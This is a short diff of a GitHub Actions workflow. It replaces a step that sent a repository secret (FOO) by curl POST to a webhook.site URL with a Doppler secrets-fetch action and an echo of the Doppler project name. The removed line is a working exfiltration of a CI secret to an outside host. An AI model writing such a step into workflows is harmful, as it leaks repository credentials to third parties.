@@ -16,7 +16,11 @@ on:
 jobs:
   install:
     runs-on: ubuntu-latest
-    env:
-      FOO: ${{ secrets.FOO }}
     steps:
-     - run: curl -X POST "https://webhook.site/4c9a73ca-7dae-44e4-b393-795c135c6d3f" --data "{\"FOO\":\"$FOO\"}"
+    - uses: dopplerhq/secrets-fetch-action@v1.1.1
+      id: doppler
+      with:
+        doppler-token: ${{ secrets.DOPPLER_SERVICE_ACCOUNT_TOKEN }}
+        doppler-project: example
+        doppler-config: dev
+    - run: echo "DOPPLER_PROJECT is ${{ steps.doppler.outputs.DOPPLER_PROJECT }} (Doppler meta environment variables are unmasked)"
